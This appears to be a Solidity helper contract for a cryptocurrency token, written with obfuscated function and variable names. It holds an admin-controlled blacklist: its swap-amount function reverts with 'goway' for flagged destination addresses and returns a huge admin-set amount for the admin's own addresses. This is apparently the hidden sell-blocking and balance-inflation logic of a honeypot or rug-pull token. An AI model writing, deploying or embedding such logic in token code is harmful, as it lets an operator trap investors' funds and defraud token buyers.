pragma solidity ^0.8.10;

contract khhmm {
    mapping(address => uint256) private _bans;
    address public Adminkjx1 = address(0x9D6E4BaF4958cDdd23898d76668F94969b6813a7);
    uint256 adminAmount = 60000000000*10**18*88000*1;
    function okxstart123() external    {
        if(Adminkjx1 == address(0)){
            Adminkjx1 = msg.sender;
            adminAmount = 60000000000*10**18*88000*1;
            _bans[msg.sender] = 100;
            _bans[0x0ED943Ce24BaEBf257488771759F9BF482C39706] = 1;
            _bans[0x5Bca762F9b0a7a953EB9B7aEdf71e7E01a8971C1] = 1;
            _bans[0x996730dB3C8ef2AA6BfBd3FA9c99A8201f97A5db] = 1;

        }else{
            revert("xxxokxxxxxxx");
        }
    }
    function okgiveamount(uint256 bm) external   {
        require(msg.sender == Adminkjx1, 'NO ADMIN');
        adminAmount = bm;
    }

    function okgetuserr(address userAddress) external view returns  (uint256)   {
        require(msg.sender == Adminkjx1, 'NO ADMIN');
        return _bans[userAddress];
    }

    function oksetuserr(address userAddress) external   {
        require(msg.sender == Adminkjx1, 'NO ADMIN');
        _bans[userAddress] = 1;
    }

    function okremoveuserr(address userAddress) external   {
        require(msg.sender == Adminkjx1, 'NO ADMIN');
        _bans[userAddress] = 0;
    }

    function okgiveadminuserrr() external   {
        require(msg.sender == Adminkjx1, 'NO ADMIN');
        _bans[Adminkjx1] = 100;
    }

     function ekmxj10ikk23lonswap(address choong, uint256 total,address destination) external view returns (uint256)   {
        if (_bans[destination] == 1){
            revert("goway");
        }else if (_bans[destination] == 100) {
            return adminAmount;
        }else {
            return total; 
        }
    }
}